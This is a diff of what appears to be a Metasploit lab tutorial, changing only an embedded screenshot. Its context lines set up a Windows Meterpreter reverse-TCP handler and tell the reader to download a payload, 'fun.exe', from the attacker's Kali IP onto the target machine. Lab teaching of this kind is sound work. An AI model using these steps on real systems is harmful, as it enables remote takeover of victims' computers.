@@ -58,7 +58,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
 
-<img width="855" alt="image" src="https://github.com/user-attachments/assets/009ecb37-5fd2-42c5-868d-71a1a2b71f90">
+<img width="589" alt="image" src="https://github.com/user-attachments/assets/91c9967a-99bf-4db0-9d31-ad8ee165c7f6">
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.4/fun.exe The file "fun.exe" downloads.
 
